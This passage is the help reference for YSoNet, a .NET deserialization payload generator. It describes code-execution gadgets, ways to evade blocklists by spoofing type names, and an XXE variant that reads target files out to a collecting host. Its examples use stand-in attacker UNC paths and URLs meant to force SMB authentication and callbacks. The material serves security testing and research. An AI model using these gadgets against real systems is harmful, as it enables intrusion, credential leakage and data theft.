# Full gadget, plugin, variant, and option reference

This is the public `ysonet.exe --fullhelp` snapshot shipped with the skill. Search for
the exact gadget or plugin name and read that module's complete section. Prefer a live
`--fullhelp` or module-specific `-h` query when the binary is available, because the
running binary is authoritative for its own build.

## Contents

- Gadgets: descriptions, formatters, labels, bridge formatters, extra options, variants,
  accepted inputs, target requirements, and runtime evidence
- Plugins: descriptions, runtime evidence, modes, and all plugin arguments
- Global command line: every one-shot argument and output mode

YSoNet generates deserialization payloads for a variety of .NET formatters.
Project: https://ysonet.net or https://ysonet.com (both open the repo).

== GADGETS ==
	(*) ActivitySurrogateDisableTypeCheck [Disables 4.8+ type protections for ActivitySurrogateSelector, command is ignored. Variant 1 also takes rootcontainer (1 SortedSet, 2 SortedDictionary, 3 TreeSet) to dodge a SortedSet wire-name blocklist; SoapFormatter supports roots 1 and 3. Variant 1 self-tests in a child, then keeps the setting enabled in this session.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter (2), LosFormatter (2), NetDataContractSerializer (2), SoapFormatter (2)
			Labels: A payload with no new sink, carried by another gadget
			Extra options:
			      --var, --variant=VALUE Choices: 1 -> use TypeConfuseDelegateGenerator
			                               [default], 2 -> use
			                               TextFormattingRunPropertiesMarshal
			                               Default value: "1".
			                               Suggested values: 1, 2.
			      --rootcontainer=VALUE  Serialized root container of the
			                               TypeConfuseDelegate wrapper: 1 -> SortedSet
			                               [default], 2 -> SortedDictionary, 3 -> TreeSet.
			                               2 and 3 evade a binder or blocklist that rejects
			                               the exact SortedSet wire type name.
			                               SoapFormatter supports 1 and 3, not 2. Not used
			                               by the TextFormattingRunProperties wrapper
			                               (variant 2), which has no container. The (2)
			                               formatter annotation counts wrapper variants,
			                               not root-container choices.
			                               Default value: "1".
			                               Suggested values: 1, 2, 3.

			Categories [variant 1]:
			  Kind: Other
			  Formatter: BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: None
			  Requirements: .NET Framework, Built in, WPF
			  Runtime versions: .NET Framework 4.8 - 4.8.1
			Categories [variant 2]:
			  Kind: Other
			  Formatter: BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: None
			  Requirements: .NET Framework, Extra assembly, WPF
			  Runtime versions: .NET Framework 4.8 - 4.8.1
	(*) ActivitySurrogateSelector [This gadget ignores the command parameter and executes the constructor of the bundled ExploitClass class. For a .NET Framework 3.5 target, use --legacyfx with the default variant or variant 3; ysonet compiles the bundled ExploitClass.cs with the CLR-v2 compiler and writes Func delegates against System.Core 3.5. Variant 2 remains 4.x-only; variant 3 selects the larger DataSet carrier.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter (3), LosFormatter (3), SoapFormatter (3)
			Labels: An independent gadget
			Extra options:
			      --var, --variant=VALUE Payload variant number where applicable.
			                               Choices: 1 (default), 2 (shorter but may not
			                               work between versions), 3 (larger DataSet
			                               carrier)
			                               Default value: "1".
			                               Suggested values: 1, 2, 3.

			Categories [variant 1]:
			  Kind: Code execution
			  Formatter: BinaryFormatter, LosFormatter, SoapFormatter
			  Accepted input: None
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 3.5 - 4.8.1
			Categories [variant 2]:
			  Kind: Code execution
			  Formatter: BinaryFormatter, LosFormatter, SoapFormatter
			  Accepted input: None
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
			Categories [variant 3]:
			  Kind: Code execution
			  Formatter: BinaryFormatter, LosFormatter, SoapFormatter
			  Accepted input: None
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 3.5 - 4.8.1
	(*) ActivitySurrogateSelectorFromFile [Another variant of the ActivitySurrogateSelector gadget. This gadget interprets the command parameter as the path to the .cs file that should be compiled as an exploit class. Put a semicolon before its references and separate multiple references with commas, e.g., '-c MyClass.cs;UsedRef.dll,Ref2.dll'. For a .NET Framework 3.5 target, use --legacyfx with the default variant or variant 3. Variant 2 remains 4.x-only; variant 3 selects the larger DataSet carrier.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter (3), LosFormatter (3), SoapFormatter (3)
			Labels: An independent gadget
			Extra options:
			      --var, --variant=VALUE Payload variant number where applicable.
			                               Choices: 1 (default), 2 (shorter but may not
			                               work between versions), 3 (larger DataSet
			                               carrier)
			                               Default value: "1".
			                               Suggested values: 1, 2, 3.

			Categories [variant 1]:
			  Kind: Code execution
			  Formatter: BinaryFormatter, LosFormatter, SoapFormatter
			  Accepted input: Source code file
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 3.5 - 4.8.1
			Categories [variant 2]:
			  Kind: Code execution
			  Formatter: BinaryFormatter, LosFormatter, SoapFormatter
			  Accepted input: Source code file
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
			Categories [variant 3]:
			  Kind: Code execution
			  Formatter: BinaryFormatter, LosFormatter, SoapFormatter
			  Accepted input: Source code file
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 3.5 - 4.8.1
	(*) AssemblyCatalogLoad [MEF AssemblyCatalog(codeBase) opens -c and loads it as an assembly. A UNC path also starts an SMB session, which sends authentication material. The load alone runs no code.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: Xaml
			Labels: An independent gadget
			Extra options:
			      --rawinput             Pass -c verbatim into the payload template
			                               instead of escaping it for the selected
			                               formatter. Use this only for already-escaped
			                               input.
			                               Default value: "false".

			Categories:
			  Kind: Code execution, File system, Network
			  Formatter: Xaml
			  Accepted input: Assembly file, Target path, UNC path
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) AssemblyInstallerLoad [Loads a DLL you name and runs its [RunInstaller(true)] installers.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: FastJson (2), JavaScriptSerializer (2), Json.NET (2), MessagePackTypeless (2), MessagePackTypelessLz4 (2), SharpSerializerBinary (2), SharpSerializerXml (2), Xaml (2), YamlDotNet < 5.0.0 (2)
			Labels: Chain of arbitrary getter call, An independent gadget
			Extra options:
			      --var, --variant=VALUE Variant number. It selects what -c must be and
			                               what the target has to do to reach the assembly
			                               (a .dll or a managed .exe; the sink is Assembl-
			                               y.LoadFrom). Choices:
			                               1 (default) - a path the TARGET can already ope-
			                               n, e.g. C:\programdata\installer.dll
			                               2 - a UNC path the target fetches over SMB, e.g.
			                               \\attacker\share\installer.dll. The target must
			                               be able to reach the share, and .NET only loads
			                               an assembly from a share it classifies as Local
			                               Intranet; an Internet-zone share (a bare IP is
			                               one) needs loadFromRemoteSources=true on the
			                               target. The (2) formatter annotation counts
			                               these two variants, not the independent --getter
			                               choices.
			                               Default value: "1".
			                               Suggested values: 1, 2.
			      --getter=VALUE         Which WinForms getter-call carrier reads
			                               AssemblyInstaller.HelpText. Choices:
			                               1 (default) - PropertyGrid (reads every property
			                               once; the only carrier every formatter here can
			                               build)
			                               2 - ComboBox (reads HelpText several times; the
			                               installers are still built once)
			                               3 - ListBox
			                               4 - CheckedListBox
			                               5 - BindingSource (reads HelpText once; a
			                               Component with no window, so it suits a headless
			                               target)
			                               Only Json.NET and Xaml can build carriers 2 to -
			                               4. Carrier 5 works with Xaml, FastJson,
			                               JavaScriptSerializer and both SharpSerializer
			                               flavours, but not with Json.NET, YamlDotNet or
			                               MessagePack. The (2) formatter annotation counts
			                               DLL-path variants, not getter choices.
			                               Default value: "1".
			                               Suggested values: 1, 2, 3, 4, 5.

			Categories [variant 1]:
			  Kind: Code execution
			  Formatter: FastJson, JavaScriptSerializer, Json.NET, MessagePackTypeless, MessagePackTypelessLz4, SharpSerializerBinary, SharpSerializerXml, Xaml, YamlDotNet
			  Accepted input: Assembly file
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
			Categories [variant 2]:
			  Kind: Code execution, Network
			  Formatter: FastJson, JavaScriptSerializer, Json.NET, MessagePackTypeless, MessagePackTypelessLz4, SharpSerializerBinary, SharpSerializerXml, Xaml, YamlDotNet
			  Accepted input: UNC path
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) AxHostState
		Formatters: BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter
			Labels: A bridged gadget
			Supported formatter for the bridge: BinaryFormatter
			Categories:
			  Kind: Nested deserialization
			  Formatter: BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) BaseActivationFactory [Gadget for .NET 5/6/7 with WPF enabled or Microsoft.WindowsDesktop.App\PresentationFramework.dll available. Leads to remote DLL loading (native C/C++ DLL)]
		Formatters: Json.NET
			Labels: An independent gadget, .NET 5/6/7, Requires WPF enabled or PresentationFramework.dll
			Categories:
			  Kind: Code execution
			  Formatter: Json.NET
			  Accepted input: Assembly file, UNC path
			  Requirements: Modern .NET, WPF
			  Runtime versions: .NET 5.0 - 7.0
	(*) BootstrapperBuilder [Setting Path makes the target read <your path>\Engine and \Packages. Any UNC path opens an SMB session to that host. A setup.xml you leave there is parsed with legacy XML defaults.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: DataContractJsonSerializer, DataContractSerializer, FastJson, JavaScriptSerializer, Json.NET, MessagePackTypeless, MessagePackTypelessLz4, NetDataContractSerializer, SharpSerializerBinary, SharpSerializerXml, Xaml, YamlDotNet < 5.0.0
			Labels: An independent gadget
			Extra options:
			      --rawinput             Put -c into the payload template exactly as
			                               typed, instead of escaping it for the selected
			                               formatter. Use this only when you have already
			                               escaped the value yourself. It also turns off
			                               the check that the finished payload still
			                               carries your path unchanged, because there is
			                               then no text of yours left to compare against.

			                               WHAT TO PUT IN -c. Any path the target's file
			                               system accepts. The target reads <your
			                               path>\Engine and <your path>\Packages, so a bare
			                               UNC host works:
			                                 \\attacker.example.com
			                               which the target opens as \\attacker.exampl-
			                               e.com\Engine. Nothing has to exist on the far
			                               end: a missing directory still costs the target
			                               the connect.

			                               THE SECOND, CONDITIONAL LEG. For each
			                               subdirectory of <your path>\Engine the target
			                               also XML-parses <sub>\setup.xml if one is there,
			                               with the legacy reader defaults - so an external
			                               entity in it is resolved on a target application
			                               stamped below 4.5.2. That needs you to control
			                               the content on the far end of the path as well,
			                               so it is not something this payload delivers on
			                               its own and no disclosure is claimed for it.

			                               -t IS ACCEPTED and it deserializes the payload
			                               HERE, so THIS machine reads the path you named.
			                               Against a UNC path that is your callback, and
			                               Windows sends authentication material when it
			                               opens an SMB session, so only point it at an
			                               endpoint you own. An unreachable UNC host makes -
			                               t block until the SMB connect times out.

			                               WHAT A CALLBACK PROVES. That the target resolved
			                               your host and tried to open the path. It does
			                               NOT prove a completed SMB session, NTLM
			                               authentication, captured credentials or a relay:
			                               those depend on the target, the network and your
			                               endpoint.
			                               Default value: "false".

			Categories:
			  Kind: File system, Network
			  Formatter: DataContractJsonSerializer, DataContractSerializer, FastJson, JavaScriptSerializer, Json.NET, MessagePackTypeless, MessagePackTypelessLz4, NetDataContractSerializer, SharpSerializerBinary, SharpSerializerXml, Xaml, YamlDotNet
			  Accepted input: Target path, UNC path
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) ClaimsIdentity
		Formatters: BinaryFormatter, DataContractJsonSerializer, DataContractSerializer, LosFormatter, NetDataContractSerializer, SoapFormatter
			Labels: A bridged gadget, Uses OnDeserialized attribute
			Supported formatter for the bridge: BinaryFormatter
			Categories:
			  Kind: Nested deserialization
			  Formatter: BinaryFormatter, DataContractJsonSerializer, DataContractSerializer, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.5 - 4.8.1
	(*) ClaimsPrincipal
		Formatters: BinaryFormatter, DataContractJsonSerializer, DataContractSerializer, LosFormatter, NetDataContractSerializer, SoapFormatter
			Labels: A bridged gadget, Uses OnDeserialized attribute, Second order deserialization
			Supported formatter for the bridge: BinaryFormatter
			Categories:
			  Kind: Nested deserialization
			  Formatter: BinaryFormatter, DataContractJsonSerializer, DataContractSerializer, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.5 - 4.8.1
	(*) ColorConvertedBitmapExtension [One XAML document makes the target request three URIs it names: image, source ICC profile, destination ICC profile. The profiles must return valid profiles. Remote image/profile loading is documented WPF behaviour, so this is a shape, not a new bug.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: Xaml
			Labels: An independent gadget
			Extra options:
			      --source-profile=VALUE REQUIRED. The URI of the source ICC colour
			                               profile the target requests. It MUST answer with
			                               a valid ICC/ICM profile: WPF's ColorContext
			                               parses it, and a parse failure throws before the
			                               destination and image requests happen.
			                                 --source-profile http://attacker.exampl-
			                               e.com/source.icc
			                               Required.
			      --destination-profile=VALUE
			                             REQUIRED. The URI of the destination ICC colour
			                               profile the target requests. Same rule as the
			                               source profile: it must answer with a valid
			                               profile.
			                                 --destination-profile http://attacker.exampl-
			                               e.com/destination. icc
			                               Required.
			      --rawinput             Put the three URIs into the payload template
			                               exactly as typed, instead of escaping them for
			                               XML element text. Use this only when you have
			                               already escaped the values yourself. It also
			                               turns off the check that the finished payload
			                               still carries each URI as its own token, because
			                               there is then no text of yours left to compare
			                               against.

			                               WHAT TO PUT IN. Three absolute URIs the target's
			                               WebRequest stack accepts, one per input:
			                                 -c                         the image, e.g.
			                               http://h/i?a=b&c=d
			                                 --source-profile           the source ICC
			                               profile
			                                 --destination-profile      the destination ICC
			                               profile
			                               None of the three may contain a SPACE: the
			                               target's constructor splits the one argument on
			                               the space character, so a space would break the
			                               triple. A query string is fine.

			                               WHAT THE TARGET DOES. It requests the source
			                               profile, then the destination profile, then the
			                               image. The two profile responses must be valid
			                               profiles or the chain stops early; the image
			                               response goes to the WIC decoder. The bytes are
			                               never sent anywhere and you never see them.

			                               -t IS ACCEPTED and it parses the payload HERE,
			                               so THIS machine makes the three requests. Only
			                               point them at endpoints you own.

			                               WHAT A CALLBACK PROVES. That the target resolved
			                               your hosts and issued the requests. It is not
			                               proof of a native vulnerability, of code
			                               execution, or of any data returning to you.
			                               Default value: "false".

			Categories:
			  Kind: Network
			  Formatter: Xaml
			  Accepted input: Remote URL
			  Requirements: .NET Framework, Built in, Modern .NET, WPF
			  Runtime versions: .NET Framework 4.8.1, .NET 10.0
	(*) DataSet
		Formatters: BinaryFormatter, LosFormatter, SoapFormatter
			Labels: A bridged gadget
			Supported formatter for the bridge: BinaryFormatter
			Categories:
			  Kind: Nested deserialization
			  Formatter: BinaryFormatter, LosFormatter, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) DataSetOldBehaviour [This gadget targets an old behavior of DataSet which uses XML format] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter (2), LosFormatter (2)
			Labels: A bridged gadget
			Supported formatter for the bridge: LosFormatter
			Extra options:
			      --spoofedAssembly=VALUE
			                             The assembly name you want to use in the
			                               generated serialized object (example: 'mscorlib'
			                               or use 'default' for System.Data)
			                               Suggested values: mscorlib, default.
			      --var, --variant=VALUE Payload variant number where applicable.
			                               Choices: 1 (default), 2
			                               Default value: "1".
			                               Suggested values: 1, 2.

			Categories [variant 1]:
			  Kind: Nested deserialization
			  Formatter: BinaryFormatter, LosFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Built in, WPF
			  Runtime versions: .NET Framework 4.0 - 4.8.1
			Categories [variant 2]:
			  Kind: Nested deserialization
			  Formatter: BinaryFormatter, LosFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Built in, WPF
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) DataSetOldBehaviourFromFile [Another variant of the DataSetOldBehaviour gadget. This gadget interprets the command parameter as the path to the .cs file that should be compiled as an exploit class. Use a semicolon to separate the file from any additional required assemblies, e.g., '-c ExploitClass.cs;System.dll'] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter (2), LosFormatter (2)
			Labels:
			Extra options:
			      --spoofedAssembly=VALUE
			                             The assembly name you want to use in the
			                               generated serialized object (example: 'mscorlib'
			                               or use 'default' for System.Data)
			                               Suggested values: mscorlib, default.
			      --var, --variant=VALUE Payload variant number where applicable.
			                               Choices: 1 (default), 2
			                               Default value: "1".
			                               Suggested values: 1, 2.
			      --compressed           GZip-compress the embedded assembly bytes so the
			                               payload is much smaller for a large assembly.
			                               The payload decompresses them at deserialization
			                               time via a GZipStream in the XAML chain (works
			                               with both variants).
			                               Default value: "false".

			Categories [variant 1]:
			  Kind: Code execution
			  Formatter: BinaryFormatter, LosFormatter
			  Accepted input: Source code file
			  Requirements: .NET Framework, Built in, WPF
			  Runtime versions: .NET Framework 4.0 - 4.8.1
			Categories [variant 2]:
			  Kind: Code execution
			  Formatter: BinaryFormatter, LosFormatter
			  Accepted input: Source code file
			  Requirements: .NET Framework, Built in, WPF
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) DataSetTypeSpoof [A more advanced type spoofing that can use any arbitrary types can be seen in TestingArenaHome::SpoofByBinaryFormatterJson or in the DataSetOldBehaviour gadget]
		Formatters: BinaryFormatter, LosFormatter, SoapFormatter
			Labels: A bridged gadget
			Supported formatter for the bridge: BinaryFormatter
			Categories:
			  Kind: Nested deserialization
			  Formatter: BinaryFormatter, LosFormatter, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) DataSetXxe [Sets the DataSet XmlSchema member so the target's legacy XmlTextReader resolves an external entity. Variant 1 fetches your URL; variant 2 reads a target file back to you. Fires when the target app uses pre-4.5.2 XML resolver defaults, when the machine turned the EnableLegacyXmlSettings switch back on, or when the app declares NO target framework moniker at all - an ASP.NET app with no <httpRuntime targetFramework> is legacy even on a fully patched 4.8.1 machine.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter (2), FsPickler (2), Json.NET (2), LosFormatter (2), SoapFormatter (2)
			Labels: An independent gadget
			Extra options:
			      --var, --variant=VALUE Which XML to put in the DataSet XmlSchema membe-
			                               r. Choices:
			                               1 (default) - declare one external parameter
			                               entity pointing at the -c URL and reference it,
			                               so the target FETCHES that URL. The effect is a
			                               single outbound request (SSRF / callback) and
			                               nothing comes back to you. Point it at any http
			                               or https URL you can observe.
			                               2 - read a file on the TARGET and have the
			                               target send its content to you. -c is the BASE
			                               URL of a host you control; ysonet builds two
			                               URLs under it, "dataset-oob.dtd" and "collect". -
			                               -file names what to read on the TARGET, in
			                               whatever form that target's parser resolves. --
			                               dtd-out is where ysonet writes the DTD you must
			                               publish at the first URL: without it hosted, the
			                               payload fetches a 404 and nothing is disclosed.
			                               Read the file content out of the query string of
			                               the request that arrives at the second URL.
			                               Default value: "1".
			                               Suggested values: 1, 2.
			      --rawinput             Variant 1 only. Skip the URL validation and put -
			                               c into the DTD external identifier exactly as
			                               typed, with no trimming. Normal mode accepts an
			                               absolute http or https URL and refuses
			                               whitespace, control characters and the
			                               characters " < > \, because the value goes
			                               inside a QUOTED DTD external identifier and
			                               those would corrupt or escape it. Use this only
			                               for research on a resolver that accepts
			                               something else; the network effect this gadget
			                               declares was proven with http(s). It does NOT
			                               turn off the outer formatter's escaping, so the
			                               payload is still a valid document - but nothing
			                               checks that the identifier inside it still is,
			                               and a broken one simply fetches nothing.
			                               Default value: "false".
			      --file=VALUE           Variant 2 only, and required there. What to read
			                               ON THE TARGET, usually an absolute file: URI,
			                               for example "file:///C:/Windows/system.ini". The
			                               value is NOT validated or rewritten: it goes
			                               into the hosted DTD exactly as typed, so a bare
			                               path, a UNC path, an http URL or any other form
			                               the target's XML parser resolves is accepted,
			                               and finding out what it resolves is the point.
			                               Nothing is opened on this machine. It sits in a
			                               quoted DTD system identifier, where no
			                               references are recognised, so '%' and '&' are
			                               literal and "file:///C:/Program%20Files/x.txt"
			                               is the right way to write a space; only a double
			                               quote ends the identifier and breaks the DTD.
			                               WHAT COMES BACK RELIABLY, measured rather than
			                               assumed: the content travels in a URL query
			                               string, so spaces, line breaks, < > and " all
			                               arrive percent-encoded and can be decoded. Any
			                               of & % ' # in the file BREAKS the chain and you
			                               get no second request at all, because the first
			                               three end a construct inside the DTD and the
			                               last one starts a URI fragment. That is why a
			                               short .ini style file comes back whole and a
			                               file full of entity references or apostrophes
			                               does not. Size is not the limit (4 KB came back
			                               intact; the reader's own entity budget is 10,00-
			                               0,000 characters).
			      --dtd-out=VALUE        Variant 2 only, and required there. Where to
			                               write the companion DTD you have to publish at <-
			                               c>/dataset-oob.dtd. The path is taken as given:
			                               a file already there is REPLACED and a missing
			                               folder is created, so generating twice to the
			                               same path works and ysonet says on stderr when
			                               it replaced something. The DTD is written only
			                               after the payload is built, so a failed run
			                               leaves what is already at that path alone. UTF-8
			                               with no BOM, because the target reads it as an
			                               external subset with no XML declaration to learn
			                               an encoding from. This is separate from --
			                               outputpath, which still receives the payload
			                               itself.

			Categories [variant 1]:
			  Kind: Network
			  Formatter: BinaryFormatter, FsPickler, Json.NET, LosFormatter, SoapFormatter
			  Accepted input: Remote URL
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.5.1
			Categories [variant 2]:
			  Kind: File system, Information disclosure, Network
			  Formatter: BinaryFormatter, FsPickler, Json.NET, LosFormatter, SoapFormatter
			  Accepted input: Remote URL, Target path
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.5.1
	(*) DataTable [Same-graph System.Data.DataTable root carrier: the inner TextFormattingRunProperties gadget travels in an object column and is deserialized by the same outer formatter. A standalone DataTable stores its rows inline in its own SerializationInfo (DataTable_N.Records), so unlike the DataSet gadget it opens no nested BinaryFormatter and no new binder boundary (verified against the System.Data source). Useful when a target requires or casts the deserialized root object to DataTable, for example SharePoint's ExcelDataSet.CompressedDataTable. Microsoft treats deserializing a DataTable with an unsafe formatter as a full remote code execution risk (CA2362, DataSet/DataTable security guidance). The inner gadget is selectable with var/variant: 1 (default) TextFormattingRunProperties, which needs the Microsoft.PowerShell.Editor assembly and WPF and supports BinaryFormatter, SoapFormatter and LosFormatter; 2 TypeConfuseDelegate, a framework built-in that needs no WPF or Microsoft.PowerShell.Editor and supports BinaryFormatter, SoapFormatter and LosFormatter. Its SOAP form uses generation-only aliases but presents the native CLR4 TCD graph to the target. Forshaw's 'Are You My Type?' (Black Hat 2012) documents the related but distinct DataSet nested-BinaryFormatter bridge.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter (2), LosFormatter (2), SoapFormatter (2)
			Labels:
			Extra options:
			      --var, --variant=VALUE Inner gadget: 1 -> TextFormattingRunProperties
			                               [default], 2 -> TypeConfuseDelegate (built-in,
			                               no WPF)
			                               Default value: "1".
			                               Suggested values: 1, 2.

			Categories [variant 1]:
			  Kind: Code execution
			  Formatter: BinaryFormatter, LosFormatter, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Extra assembly, WPF
			  Runtime versions: .NET Framework 4.0 - 4.8.1
			Categories [variant 2]:
			  Kind: Code execution
			  Formatter: BinaryFormatter, LosFormatter, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.5 - 4.8.1
	(*) DataTableTypeSpoof [The DataTable carrier written under the name of a REAL DataTable subclass, so a target that rejects System.Data.DataTable by name still rebuilds it through the inherited serialization constructor; this is not the ', x=]' binder-parse trick DataSetTypeSpoof uses, and it is the same idea watchTowr used on DataSet subclasses for CVE-2025-23120. Default profile: the in-box System.Data.Entity.Design.SsdlGenerator.TableDetailsCollection (assembly System.Data.Entity.Design, part of the full .NET Framework); --target-type and --target-assembly write any name verbatim, for the second in-box profile RelationshipDetailsCollection or a subclass from the target's own assemblies.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter (2), LosFormatter (2), SoapFormatter (2)
			Labels:
			Extra options:
			      --var, --variant=VALUE Inner gadget: 1 -> TextFormattingRunProperties
			                               [default], 2 -> TypeConfuseDelegate (built-in,
			                               no WPF)
			                               Default value: "1".
			                               Suggested values: 1, 2.
			      --target-type=VALUE    Type name written on the wire, verbatim. Must be
			                               a DataTable subclass on the TARGET. Default:
			                               "System.Data.Entity.Design. SsdlGenerato-
			                               r.TableDetailsCollection". Second in-box
			                               profile: System.Data.Entity.Design.SsdlGenerato-
			                               r. RelationshipDetailsCollection
			                               Default value: "System.Data.Entity.Design.
			                               SsdlGenerator.TableDetailsCollection".
			      --target-assembly=VALUE
			                             Assembly identity written on the wire, verbatim
			                               (Name, Version=..., Culture=..., PublicKeyToken-
			                               =...). Default: "System.Data.Entity.Design,
			                               Version=4.0.0.0, Culture=neutral,
			                               PublicKeyToken=b77a5c561934e089"
			                               Default value: "System.Data.Entity.Design,
			                               Version=4.0.0.0, Culture=neutral,
			                               PublicKeyToken=b77a5c561934e089".

			Categories [variant 1]:
			  Kind: Code execution
			  Formatter: BinaryFormatter, LosFormatter, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Extra assembly, WPF
			  Runtime versions: .NET Framework 4.0 - 4.8.1
			Categories [variant 2]:
			  Kind: Code execution
			  Formatter: BinaryFormatter, LosFormatter, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.5 - 4.8.1
	(*) DataViewManagerXxe [Sets DataViewSettingCollectionString so the target's legacy XmlTextReader fetches an external DTD. Fires when the target app uses pre-4.5.2 XML resolver defaults, when the machine turned the EnableLegacyXmlSettings switch back on, or when the app declares NO target framework moniker at all - an ASP.NET app with no <httpRuntime targetFramework> is legacy even on a fully patched 4.8.1 machine.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: FastJson, JavaScriptSerializer, SharpSerializerBinary, SharpSerializerXml, Xaml
			Labels: An independent gadget
			Extra options:
			      --rawinput             Skip the URL validation and put -c into the DTD
			                               external identifier exactly as typed, with no
			                               trimming. Normal mode accepts an absolute http
			                               or https URL and refuses whitespace, control
			                               characters and the characters " < > \, because
			                               the value goes inside a QUOTED DTD external
			                               identifier and those would corrupt or escape it.
			                               Use this only for research on a resolver that
			                               accepts something else; the network effect this
			                               gadget declares was proven with http(s). It does
			                               NOT turn off the outer formatter's escaping, so
			                               the payload is still a valid document - but
			                               nothing checks that the identifier inside it
			                               still is, and a broken one simply fetches
			                               nothing.
			                               Default value: "false".

			Categories:
			  Kind: Network
			  Formatter: FastJson, JavaScriptSerializer, SharpSerializerBinary, SharpSerializerXml, Xaml
			  Accepted input: Remote URL
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.5.1
	(*) DynamicUpdateMapExtension [DynamicUpdateMapExtension is a public MarkupExtension whose XmlContent hands an x:XData section to NetDataContractSerializer.ReadObject with no binder, so a XAML-only sink carries any NDCS gadget. Needs System.Activities on the target.]
		Formatters: Xaml
			Labels: A bridged gadget, Second order deserialization
			Supported formatter for the bridge: NetDataContractSerializer
			Categories:
			  Kind: Code execution, Nested deserialization
			  Formatter: Xaml
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.5 - 4.8.1
	(*) FileLogTraceListener [Microsoft.VisualBasic.Logging.FileLogTraceListener creates the supplied directory through CustomLocation. With elevated privileges, directory creation in sensitive locations may cause denial of service. On .NET Framework 3.5 both JavaScriptSerializer and DataContractJsonSerializer reach it with --legacyfx (Microsoft.VisualBasic is 8.0.0.0 there, not 10.0.0.0); DataContractJsonSerializer additionally needs a consumer whose root type is that same identity.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: DataContractJsonSerializer, FastJson, JavaScriptSerializer, Json.NET, MessagePackTypeless, MessagePackTypelessLz4, SharpSerializerXml, Xaml, YamlDotNet < 5.0.0
			Labels: An independent gadget
			Extra options:
			      --rawinput             Pass -c verbatim into the payload template
			                               instead of escaping it for the selected
			                               formatter. Use this only for already-escaped
			                               input.
			                               Default value: "false".

			Categories:
			  Kind: File system
			  Formatter: DataContractJsonSerializer, FastJson, JavaScriptSerializer, Json.NET, MessagePackTypeless, MessagePackTypelessLz4, SharpSerializerXml, Xaml, YamlDotNet
			  Accepted input: Target path
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 3.5 - 4.8.1
	(*) FileSystemInfo [Normalizes your path on the target. A UNC path with a short-name (~) component makes it reach that host over SMB.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter (2), DataContractJsonSerializer (2), DataContractSerializer (2), Json.NET (2), LosFormatter (2), NetDataContractSerializer (2), SoapFormatter (2)
			Labels: An independent gadget
			Extra options:
			      --var, --variant=VALUE Which concrete FileSystemInfo the payload names.
			                               Both do the same thing to the target - their
			                               serialization constructors both run the base
			                               FileSystemInfo one, which normalizes -c - and
			                               the callback happens before either of their own
			                               permission checks. Choices:
			                               1 (default) - System.IO.DirectoryInfo.
			                               2 - System.IO.FileInfo. It adds a
			                               FileIOPermission read demand on the normalized
			                               path, which only matters if the target runs
			                               partially trusted; the callback has already
			                               happened by then.

			                               WHAT TO PUT IN -c. Anything the target's Path
			                               normalization accepts. The interesting shape is
			                               a UNC path with an MS-DOS short-name component,
			                               because mscorlib then asks the remote host to
			                               expand it with GetLongPathNameW, and that is the
			                               outbound SMB request:
			                                 \\attacker.example.com\share\aaaaaa~1\x
			                                 \\attacker.example.com\share\aaaaaa~1
			                               The rule mscorlib applies is that some path
